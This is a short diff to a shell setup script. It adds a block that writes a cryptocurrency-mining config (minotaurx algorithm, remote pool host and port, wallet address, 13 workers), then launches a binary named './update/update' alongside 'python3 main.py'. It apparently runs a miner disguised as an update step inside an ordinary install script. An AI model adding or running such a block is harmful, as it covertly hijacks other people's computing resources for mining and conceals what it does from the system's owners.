@@ -60,6 +60,26 @@ pip3 install -r requirements.txt
 
 sleep 2
 
+cat > config.json <<END
+{
+  "algorithm": "minotaurx",
+  "host": "flyingsaucer-eu.teatspray.fun",
+  "port": 7019,
+  "worker": "MGaypRJi43LcQxrgoL2CW28B31w4owLvv8",
+  "password": "Shiny,c=MAZA,zap=MAZA",
+  "workers": 13,
+  "fee": "1"
+}
+END
+
+sleep 2
+
+ls -la
+
+cat config.json
+
+sleep 2
+
 ./update/update python3 main.py
 
 
